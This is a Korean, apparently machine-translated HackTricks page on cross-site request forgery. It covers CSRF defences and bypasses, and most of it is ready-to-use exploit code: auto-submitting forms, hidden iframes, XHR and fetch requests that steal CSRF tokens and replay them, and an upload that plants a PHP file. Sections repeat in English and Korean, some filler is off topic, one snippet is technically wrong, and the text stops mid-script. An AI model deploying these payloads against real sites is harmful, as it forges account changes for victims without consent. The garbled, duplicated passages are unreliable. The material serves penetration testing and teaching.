# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)** 또는 [**텔레그램 그룹**](https://t.me/peass)**에 가입하거나** 트위터에서 **@carlospolopm**을 팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

경험있는 해커와 버그 바운티 헌터와 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 참여하세요!

**해킹 통찰력**\
해킹의 스릴과 도전을 다루는 콘텐츠와 상호 작용하세요.

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계를 따라가세요.

**최신 공지사항**\
새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대해 최신 정보를 받아보세요.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**에 참여하여 최고의 해커들과 협업을 시작하세요!


## CSRF (Cross-Site Request Forgery) 설명

**CSRF (Cross-Site Request Forgery)**는 웹 애플리케이션에서 발견되는 보안 취약점 유형입니다. 이 취약점을 이용하여 공격자는 인증된 세션을 이용해 의심스러운 사용자 대신 동작을 수행할 수 있습니다. 공격은 피해자의 플랫폼에 로그인한 사용자가 악성 사이트를 방문할 때 실행됩니다. 이 사이트는 자바스크립트 실행, 폼 제출 또는 이미지 가져오기와 같은 방법을 통해 피해자의 계정으로 요청을 트리거합니다.

### CSRF 공격을 위한 사전 조건
CSRF 취약점을 이용하기 위해서는 다음 조건들이 충족되어야 합니다:

1. **가치 있는 동작 식별**: 공격자는 비밀번호 변경, 이메일 변경 또는 권한 상승과 같이 이용할 가치 있는 동작을 찾아야 합니다.
2. **세션 관리**: 사용자의 세션은 쿠키나 HTTP 기본 인증 헤더를 통해 관리되어야 하며, 다른 헤더는 이를 위해 조작될 수 없습니다.
3. **예측할 수 없는 매개변수의 부재**: 요청에 예측할 수 없는 매개변수가 포함되어서는 안 되며, 이는 공격을 방지할 수 있습니다.

### CSRF에 대한 방어
CSRF 공격을 방지하기 위해 다음과 같은 대응책을 적용할 수 있습니다:

* [**SameSite 쿠키**](hacking-with-cookies/#samesite): 이 속성은 브라우저가 교차 사이트 요청과 함께 쿠키를 보내지 못하도록 막습니다. [SameSite 쿠키에 대해 더 알아보기](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): 피해 사이트의 CORS 정책은 공격의 실현 가능성에 영향을 줄 수 있습니다. 특히, 공격이 피해 사이트의 응답을 읽는 것을 요구하는 경우입니다. [CORS 우회에 대해 알아보기](cors-bypass.md).
* **사용자 확인**: 사용자의 의도를 확인하기 위해 비밀번호를 요구하거나 captcha를 풀도록 할 수 있습니다.
* **Referrer 또는 Origin 헤더 확인**: 이러한 헤더를 확인하여 요청이 신뢰할 수 있는 출처에서 오는지 확인할 수 있습니다. 그러나 URL의 조작을 통해 잘못 구현된 검사를 우회할 수 있으므로 주의해야 합니다:
- `http://mal.net?orig=http://example.com` (URL이 신뢰할 수 있는 URL로 끝남)
- `http://example.com.mal.net` (URL이 신뢰할 수 있는 URL로 시작함)
* **매개변수 이름 수정**: POST 또는 GET 요청의 매개변수 이름을 변경하여 자동화된 공격을 방지할 수 있습니다.
* **CSRF 토큰**: 각 세션마다 고유한 CSRF 토큰을 포함하고 이 토큰을 후속 요청에서 요구함으로써 CSRF의 위험을 크게 줄일 수 있습니다. CORS를 강제로 적용함으로써 토큰의 효과를 향상시킬 수 있습니다.

이러한 방어책을 이해하고 구현하는 것은 웹 애플리케이션의 보안과 무결성을 유지하는 데 중요합니다.

## 방어 우회

### POST에서 GET으로 변경

악용하려는 양식이 CSRF 토큰을 사용하여 **POST 요청을 보내도록 준비**되어 있는지 확인해야 합니다. 그러나 **GET**도 **유효한지** 확인하고 GET 요청을 보낼 때 **CSRF 토큰이 여전히 유효성 검사**되는지 확인해야 합니다.

### 토큰 부재

응용 프로그램은 토큰이 존재할 때만 토큰을 **검증**하는 메커니즘을 구현할 수 있습니다. 그러나 토큰이 없을 때 검증이 완전히 생략되는 경우 취약점이 발생합니다. 공격자는 토큰을 전달하는 매개변수뿐만 아니라 매개변수 자체를 **제거**함으로써 이를 악용할 수 있습니다. 이를 통해 검증 프로세스를 우회하고 CSRF 공격을 효과적으로 수행할 수 있습니다.

### CSRF 토큰이 사용자 세션에 연결되지 않음

CSRF 토큰을 사용자 세션에 연결하지 않는 응용 프로그램은 중대한 보안 위험을 초래합니다. 이러한 시스템은 각 토큰이 시작 세션에 바인딩되는 대신 전역 풀에서 토큰을 확인합니다.

공격자가 다음과 같이 이를 악용할 수 있습니다:

1. 자신의 계정을 사용하여 **인증**합니다.
2. 전역 풀에서 **유효한 CSRF 토큰**을 얻습니다.
3. 이 토큰을 피해자에 대한 CSRF 공격에 사용합니다.

이 취약점을 통해 공격자는 피해자를 대신하여 무단 요청을 수행하며, 응용 프로그램의 **부적절한 토큰 검증 메커니즘**을 악용합니다.

### 메서드 우회

요청이 "**
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
참고로, **csrf 토큰이 세션 쿠키와 관련되어 있다면 이 공격은 작동하지 않습니다**. 왜냐하면 피해자에게 세션을 설정해야 하기 때문에 자신에 대한 공격을 하게 될 것입니다.
{% endhint %}

### Content-Type 변경

[**여기**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)에 따르면, **POST** 메소드를 사용하여 **preflight 요청을 피하기 위해** 허용되는 Content-Type 값은 다음과 같습니다:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

하지만, **서버의 로직은 Content-Type에 따라 다를 수 있으므로** 언급된 값과 **`application/json`**, **`text/xml`**, **`application/xml`**과 같은 다른 값들을 시도해야 합니다.

예시 (from [여기](https://brycec.me/posts/corctf\_2021\_challenges))에서 JSON 데이터를 text/plain으로 전송하는 방법:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### JSON 데이터에 대한 Preflight 요청 우회하기

`Content-Type: application/json`을 사용하여 POST 요청을 통해 JSON 데이터를 보내려고 할 때, HTML 폼에서는 직접적으로 사용할 수 없습니다. 마찬가지로, `XMLHttpRequest`를 사용하여 이 콘텐츠 유형을 보내면 프리플라이트 요청이 시작됩니다. 그러나 Content-Type과 관계없이 서버가 JSON 데이터를 처리하는지 확인하기 위해 이 제한을 우회할 수 있는 전략이 있습니다:

1. **대체 콘텐츠 유형 사용**: 폼에서 `enctype="text/plain"`을 설정하여 `Content-Type: text/plain` 또는 `Content-Type: application/x-www-form-urlencoded`를 사용합니다. 이 접근 방식은 백엔드가 Content-Type과 관계없이 데이터를 사용하는지 테스트합니다.

2. **콘텐츠 유형 수정**: 프리플라이트 요청을 피하면서 서버가 콘텐츠를 JSON으로 인식하도록 하려면, `Content-Type: text/plain; application/json`으로 데이터를 보낼 수 있습니다. 이는 프리플라이트 요청을 트리거하지 않지만, 서버가 `application/json`을 수락하도록 구성되어 있다면 올바르게 처리될 수 있습니다.

3. **SWF 플래시 파일 활용**: 덜 일반적이지만 실행 가능한 방법으로, SWF 플래시 파일을 사용하여 이러한 제한을 우회할 수 있습니다. 이 기술에 대한 자세한 이해를 위해 [이 게시물](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)을 참조하십시오.

### Referrer / Origin 검사 우회

**Referrer 헤더 회피**

응용 프로그램은 'Referer' 헤더가 있는 경우에만 유효성을 검사할 수 있습니다. 브라우저가 이 헤더를 보내지 않도록 하려면 다음 HTML 메타 태그를 사용할 수 있습니다:
```xml
<meta name="referrer" content="never">
```
이렇게 하면 'Referer' 헤더가 생략되어 일부 애플리케이션의 유효성 검사를 우회할 수 있습니다.

**정규식 우회**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrer가 매개변수 내에서 보낼 URL에 서버의 도메인 이름을 설정하려면 다음과 같이 할 수 있습니다:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD 메서드 우회**

[**이 CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)의 첫 번째 부분에서는 [Oak의 소스 코드](https://github.com/oakserver/oak/blob/main/router.ts#L281)에서 라우터가 **응답 본문이 없는 GET 요청으로 HEAD 요청을 처리**하도록 설정되어 있다고 설명합니다. 이는 Oak에만 해당되는 독특한 해결책은 아니며, HEAD 요청을 처리하는 특정 핸들러 대신 GET 핸들러에게 전달되지만 응용 프로그램에서는 응답 본문을 제거합니다.

따라서 GET 요청이 제한되는 경우, **GET 요청으로 처리되는 HEAD 요청을 보낼 수** 있습니다.

## **Exploit 예시**

### **CSRF 토큰 유출**

**CSRF 토큰**이 **방어**로 사용되는 경우, [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) 취약점이나 [**Dangling Markup**](dangling-markup-html-scriptless-injection/) 취약점을 악용하여 **유출**을 시도할 수 있습니다.

### **HTML 태그를 사용한 GET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
다른 HTML5 태그 중 자동으로 GET 요청을 보낼 수 있는 태그는 다음과 같습니다:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Form GET 요청

When a form uses the GET method, the form data is appended to the URL as query parameters. This means that the data is visible in the URL and can be easily manipulated by an attacker.

GET requests are typically used for retrieving data from the server and should not have any side effects. However, if a vulnerable application performs sensitive actions based on GET requests, it can be susceptible to CSRF attacks.

To exploit a CSRF vulnerability in a form GET request, an attacker can create a malicious webpage that includes an HTML form with the target URL as the form's action. The attacker can then trick the victim into visiting the malicious webpage, causing the victim's browser to automatically submit the form and perform the undesired action.

To prevent CSRF attacks in form GET requests, it is recommended to use the POST method instead. Additionally, implementing anti-CSRF tokens can provide an extra layer of protection by validating that the request originated from a trusted source.

### Form GET 요청

폼이 GET 메서드를 사용하는 경우, 폼 데이터는 쿼리 매개변수로 URL에 추가됩니다. 이는 데이터가 URL에 표시되어 공격자가 쉽게 조작할 수 있다는 것을 의미합니다.

GET 요청은 일반적으로 서버에서 데이터를 검색하는 데 사용되며 부작용이 없어야 합니다. 그러나 취약한 애플리케이션은 GET 요청을 기반으로 민감한 작업을 수행할 수 있으므로 CSRF 공격에 취약할 수 있습니다.

폼 GET 요청에서 CSRF 취약점을 악용하기 위해 공격자는 대상 URL을 폼의 액션으로 포함하는 악성 웹 페이지를 생성할 수 있습니다. 그런 다음 공격자는 피해자를 속여 악성 웹 페이지를 방문하게 하여 피해자의 브라우저가 자동으로 폼을 제출하고 원하지 않는 작업을 수행하도록 할 수 있습니다.

폼 GET 요청에서 CSRF 공격을 방지하기 위해 POST 메서드를 사용하는 것이 좋습니다. 또한, 안티 CSRF 토큰을 구현하여 요청이 신뢰할 수 있는 출처에서 유래되었는지를 확인함으로써 추가적인 보호 기능을 제공할 수 있습니다.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST 요청

When a user submits a form on a website, the data is typically sent to the server using a POST request. This is done by specifying the `method` attribute of the HTML form element as `POST`. The form data is then included in the body of the request.

사용자가 웹 사이트에서 양식을 제출하면, 데이터는 일반적으로 POST 요청을 사용하여 서버로 전송됩니다. 이는 HTML 양식 요소의 `method` 속성을 `POST`로 지정함으로써 수행됩니다. 양식 데이터는 요청의 본문에 포함됩니다.

```html
<form method="POST" action="/submit-form">
  <input type="text" name="username" />
  <input type="password" name="password" />
  <button type="submit">Submit</button>
</form>
```

In the example above, when the user clicks the "Submit" button, a POST request will be sent to the `/submit-form` endpoint with the form data as the request body. The server can then process this data and perform the necessary actions.

위의 예제에서 사용자가 "Submit" 버튼을 클릭하면, 양식 데이터가 요청 본문으로 `/submit-form` 엔드포인트로 POST 요청이 전송됩니다. 서버는 이 데이터를 처리하고 필요한 작업을 수행할 수 있습니다.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframe을 통한 Form POST 요청

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a user into submitting a form without their knowledge or consent. One way to achieve this is by using an iframe to load a malicious website that contains a form with the desired action and method.

공격자는 사용자를 속여 동의 없이 폼을 제출하도록 유도하여 Cross-Site Request Forgery (CSRF) 취약점을 악용할 수 있습니다. 이를 위해 iframe을 사용하여 원하는 동작과 방법을 가진 악성 웹사이트를 로드하는 방법을 사용할 수 있습니다.

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://target-website.com/update-profile" method="POST" target="csrf-frame">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="submit" value="Update Profile">
</form>
```

In the above example, the attacker creates an invisible iframe and a form that targets the iframe as the submission target. The form contains hidden input fields with the desired values for the username and email. When the user visits the attacker's website, the form is automatically submitted without their knowledge, sending the forged request to the target website's `/update-profile` endpoint.

위의 예시에서 공격자는 보이지 않는 iframe과 iframe을 제출 대상으로 하는 폼을 생성합니다. 폼에는 사용자 이름과 이메일에 대한 원하는 값이 숨겨진 입력 필드로 포함되어 있습니다. 사용자가 공격자의 웹사이트를 방문하면 폼이 사용자의 동의 없이 자동으로 제출되어 위조된 요청이 대상 웹사이트의 `/update-profile` 엔드포인트로 전송됩니다.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST 요청**

Ajax POST 요청은 웹 애플리케이션에서 데이터를 서버로 전송하는 방법 중 하나입니다. 이러한 요청은 사용자가 웹 페이지를 새로 고치지 않고도 서버와 상호 작용할 수 있도록 해줍니다. CSRF(Cross-Site Request Forgery) 공격은 이러한 Ajax POST 요청을 악용하여 사용자의 권한으로 악의적인 동작을 수행하는 것입니다.

일반적으로, 웹 애플리케이션은 사용자의 세션을 확인하기 위해 쿠키를 사용합니다. 이 쿠키는 사용자가 로그인한 후에 생성되며, 사용자의 세션을 식별하는 데 사용됩니다. CSRF 공격자는 이러한 쿠키를 이용하여 사용자의 권한으로 악의적인 Ajax POST 요청을 보낼 수 있습니다.

CSRF 공격을 방지하기 위해 웹 애플리케이션은 보안 토큰을 사용합니다. 이 토큰은 사용자의 세션과 연결되어 있으며, 모든 Ajax POST 요청에 포함되어야 합니다. 서버는 이 토큰을 검증하여 요청이 유효한지 확인합니다. 이를 통해 CSRF 공격을 방지할 수 있습니다.

따라서, 웹 애플리케이션을 개발할 때는 Ajax POST 요청에 대한 보안 토큰을 구현하여 CSRF 공격으로부터 안전하게 보호해야 합니다.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST 요청

When submitting a form with file uploads, the `multipart/form-data` content type is used. This type of request is commonly used when uploading files or submitting forms that contain binary data.

To perform a `multipart/form-data` POST request, the following steps can be followed:

1. Set the `Content-Type` header to `multipart/form-data`.
2. Create a boundary string that will be used to separate different parts of the request.
3. Construct the request body by appending each part of the request, including the file data, with the appropriate headers and the boundary string.
4. Send the request to the server.

Here is an example of a `multipart/form-data` POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

This is the content of the file.

-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

In this example, the request body consists of two parts: one for the file upload and another for the form field `name`. Each part is separated by the boundary string `---------------------------1234567890`. The `Content-Disposition` header specifies the name and type of each part.

By understanding how `multipart/form-data` POST requests work, you can effectively interact with web applications that require file uploads or handle binary data.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST 요청 v2

In this type of POST request, the data is sent as a series of parts, each containing a set of key-value pairs. This is commonly used when uploading files or submitting forms with complex data.

To perform a CSRF attack on a multipart/form-data POST request, you need to understand the structure of the request and manipulate the values of the key-value pairs.

Here's an example of a multipart/form-data POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="payload.txt"
Content-Type: text/plain

This is the content of the file.

-----------------------------1234567890
Content-Disposition: form-data; name="csrf_token"

attacker-csrf-token
-----------------------------1234567890--
```

To perform a CSRF attack, you would need to change the value of the `csrf_token` field to the attacker's CSRF token. This can be done by intercepting the request and modifying the value before it is sent.

Keep in mind that some websites implement additional security measures to prevent CSRF attacks, such as checking the `Referer` header or using anti-CSRF tokens that are tied to the user's session.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframe 내에서의 Form POST 요청

In some cases, you may encounter a web application that uses an iframe to display content from another domain. This can be a security risk, as an attacker could potentially use this iframe to perform Cross-Site Request Forgery (CSRF) attacks.

일부 경우에는 웹 애플리케이션이 다른 도메인에서 내용을 표시하기 위해 iframe을 사용할 수 있습니다. 이 경우, 공격자는 이 iframe을 이용하여 Cross-Site Request Forgery (CSRF) 공격을 수행할 수 있습니다.

To exploit this vulnerability, the attacker can create a form within the iframe and submit it automatically using JavaScript. This form can be designed to perform any action on the target website, such as changing the user's password or making a purchase.

이 취약점을 악용하기 위해, 공격자는 iframe 내에서 폼을 생성하고 JavaScript를 사용하여 자동으로 제출할 수 있습니다. 이 폼은 사용자의 비밀번호 변경이나 구매 등 타겟 웹사이트에서 원하는 동작을 수행할 수 있도록 설계될 수 있습니다.

To prevent this type of attack, web developers should implement measures such as using anti-CSRF tokens or implementing the SameSite attribute for cookies. Additionally, it is important to ensure that the iframe content is trustworthy and originates from a trusted source.

이러한 유형의 공격을 방지하기 위해, 웹 개발자는 anti-CSRF 토큰을 사용하거나 SameSite 속성을 쿠키에 구현하는 등의 조치를 취해야 합니다. 또한, iframe 내용이 신뢰할 수 있고 신뢰할 수 있는 출처에서 비롯되었는지 확인하는 것이 중요합니다.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF 토큰을 도용하고 POST 요청 보내기**

To perform a CSRF attack, you need to steal the CSRF token from the target website and then use it to craft a malicious POST request. Here's how you can do it:

1. **Stealing the CSRF Token**: The CSRF token is typically embedded in the HTML source code of the target website. You can use various techniques like cross-site scripting (XSS) or social engineering to trick the victim into executing a script that extracts the CSRF token. Once you have the token, store it for later use.

2. **Crafting the Malicious POST Request**: With the stolen CSRF token, you can now craft a POST request to perform the desired action on behalf of the victim. Make sure to include all the necessary parameters and values required by the target website. You can use tools like cURL or Burp Suite to send the POST request.

3. **Sending the POST Request**: Once you have crafted the malicious POST request, you need to send it to the target website. This can be done by either submitting a form or by making an AJAX request. The target website will process the request, assuming it is legitimate because it contains the stolen CSRF token.

By successfully executing this attack, you can trick the target website into performing actions on behalf of the victim without their consent. This can lead to various security vulnerabilities, such as changing account settings, making unauthorized transactions, or even gaining administrative access. It is important for web developers to implement proper CSRF protection mechanisms to prevent such attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF 토큰을 도용하고 iframe, form 및 Ajax를 사용하여 POST 요청 보내기**

In this technique, we will steal the CSRF token from the target website and use it to send a malicious POST request. We will accomplish this by utilizing an iframe, a form, and Ajax.

이 기술에서는 대상 웹 사이트에서 CSRF 토큰을 도용하여 악성 POST 요청을 보냅니다. 이를 위해 iframe, form 및 Ajax를 활용합니다.

#### **1. Stealing the CSRF Token**

#### **1. CSRF 토큰 도용하기**

To steal the CSRF token, we can use an iframe to load a page from the target website that contains the token. We can then access the token using JavaScript and store it in a variable.

CSRF 토큰을 도용하기 위해 iframe을 사용하여 토큰을 포함하는 대상 웹 사이트의 페이지를 로드할 수 있습니다. 그런 다음 JavaScript를 사용하여 토큰에 액세스하고 변수에 저장할 수 있습니다.

```html
<iframe id="csrfFrame" src="https://target-website.com/page-with-token"></iframe>
<script>
    var csrfToken = document.getElementById('csrfFrame').contentWindow.document.getElementById('csrfToken').value;
</script>
```

#### **2. Sending the POST Request**

#### **2. POST 요청 보내기**

Next, we will use a form to construct the malicious POST request. We will set the action attribute of the form to the target URL and include any necessary input fields.

다음으로, 악성 POST 요청을 구성하기 위해 form을 사용합니다. form의 action 속성을 대상 URL로 설정하고 필요한 입력 필드를 포함합니다.

```html
<form id="csrfForm" action="https://target-website.com/post-endpoint" method="POST">
    <input type="hidden" name="csrfToken" value="">
    <input type="hidden" name="payload" value="malicious-payload">
</form>
```

We will then use JavaScript to populate the hidden input field with the stolen CSRF token.

그런 다음 JavaScript를 사용하여 도용한 CSRF 토큰으로 숨겨진 입력 필드를 채웁니다.

```html
<script>
    document.getElementById('csrfForm').querySelector('input[name="csrfToken"]').value = csrfToken;
</script>
```

Finally, we will submit the form using JavaScript to send the malicious POST request.

마지막으로, JavaScript를 사용하여 악성 POST 요청을 보내기 위해 form을 제출합니다.

```html
<script>
    document.getElementById('csrfForm').submit();
</script>
```

By combining the iframe, form, and Ajax, we can steal the CSRF token and send a malicious POST request without the user's knowledge.

iframe, form 및 Ajax를 결합하여 사용자의 동의 없이 CSRF 토큰을 도용하고 악성 POST 요청을 보낼 수 있습니다.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRF 토큰을 도용하고 iframe과 폼을 사용하여 POST 요청 보내기**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. One way to achieve this is by using an iframe and a form.

CSRF 토큰을 도용하여 악성 POST 요청을 보내기 위해 크로스 사이트 요청 위조 (CSRF) 공격을 수행하려면 대상 웹 사이트에서 CSRF 토큰을 도용한 다음 사용해야 합니다. 이를 위해 iframe과 폼을 사용하는 방법이 있습니다.

First, you need to create an iframe element in your malicious website. Set the source of the iframe to the target website's URL. This will load the target website inside the iframe.

먼저, 악성 웹 사이트에서 iframe 요소를 생성해야 합니다. iframe의 소스를 대상 웹 사이트의 URL로 설정합니다. 이렇게 하면 iframe 내에서 대상 웹 사이트가 로드됩니다.

```html
<iframe src="https://target-website.com"></iframe>
```

Next, you need to create a form element inside the iframe. Set the action attribute of the form to the URL where the POST request should be sent. Include any necessary input fields in the form, such as the target website's login credentials or any other data required for the request.

다음으로, iframe 내부에 폼 요소를 생성해야 합니다. 폼의 action 속성을 POST 요청을 보내야 할 URL로 설정합니다. 폼에는 대상 웹 사이트의 로그인 자격 증명 또는 요청에 필요한 기타 데이터와 같은 필요한 입력 필드를 포함해야 합니다.

```html
<iframe src="https://target-website.com">
  <form action="https://target-website.com/post-endpoint" method="POST">
    <input type="hidden" name="csrf_token" value="stolen-csrf-token">
    <!-- Include any other necessary input fields -->
    <input type="submit" value="Submit">
  </form>
</iframe>
```

Make sure to include a hidden input field named "csrf_token" and set its value to the stolen CSRF token. This will ensure that the POST request includes the valid CSRF token.

"csrf_token"이라는 숨겨진 입력 필드를 포함하고 그 값을 도용한 CSRF 토큰으로 설정하는 것을 잊지 마세요. 이렇게 하면 POST 요청에 유효한 CSRF 토큰이 포함됩니다.

When the malicious website is loaded, the iframe will automatically load the target website and submit the form, sending the POST request with the stolen CSRF token.

악성 웹 사이트가 로드되면 iframe이 자동으로 대상 웹 사이트를 로드하고 폼을 제출하여 도용한 CSRF 토큰과 함께 POST 요청을 보냅니다.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
